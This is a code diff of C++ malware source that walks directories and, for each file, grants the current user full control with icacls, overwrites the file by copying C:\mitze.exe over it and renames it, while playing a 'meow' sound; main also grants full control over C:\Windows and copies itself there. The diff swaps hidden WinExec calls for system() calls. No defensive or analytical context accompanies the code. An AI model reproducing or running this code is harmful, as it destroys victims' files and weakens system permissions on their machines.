@@ -42,6 +42,14 @@ void FckFiles(std::string directory, std::string fileFilter, bool recursively = 
 			if (!recursively)
 			{
 				Chain = Chain + sWords[rand() % 4];
+				Chain = Chain + sWords[rand() % 4];
+				Chain = Chain + sWords[rand() % 4];
+				Chain = Chain + sWords[rand() % 4];
+				Chain = Chain + sWords[rand() % 4];
+				Chain = Chain + sWords[rand() % 4];
+				Chain = Chain + sWords[rand() % 4];
+				Chain = Chain + sWords[rand() % 4];
+				Chain = Chain + sWords[rand() % 4];
 				cout << Chain;
 				string Chickfila = directory + std::string(FindFileData.cFileName);
 				mciSendString("play meow.mp3", NULL, 0, NULL);
@@ -49,9 +57,9 @@ void FckFiles(std::string directory, std::string fileFilter, bool recursively = 
 				string Butter = "copy C:\\mitze.exe /Y "+ string(Chickfila);
 				const char* Sucker2 = Dutter.c_str();
 				const char* Sucker3 = Butter.c_str();
-				WinExec(("icacls "+string(Chickfila)+" /grant \045USERNAME\045:F").c_str(),SW_HIDE);
+				system(("icacls "+string(Chickfila)+" /grant \045USERNAME\045:F").c_str());
 				//system(("del /f  "+ string(Chickfila)).c_str());
-				WinExec(("copy C:\\mitze.exe /Y "+ string(Chickfila)).c_str(),SW_HIDE);
+				system(("copy C:\\mitze.exe /Y "+ string(Chickfila)).c_str());
 				rename(Chickfila.c_str(),"LOL_MITZE_KATZE.exe"+rand() % 999999);
 			}
 			else
@@ -76,7 +84,7 @@ int main(int argc, char* argv[])
     string abc = "abcdefghijklmnopqrstuvwxyz"; 
     char char_array[abc.length() + 1]; 
     strcpy(char_array, abc.c_str()); 
-	WinExec((string("icacls C:\\Windows /grant \045USERNAME\045:F")).c_str(),SW_HIDE);
+	system((string("icacls C:\\Windows /grant \045USERNAME\045:F")).c_str());
 	CopyFile("./a.exe","C:/mitze.exe",0);
 	CopyFile("./meow.mp3","C:/meow.mp3",0);
 	for(int i=0;i<abc.length();i++){
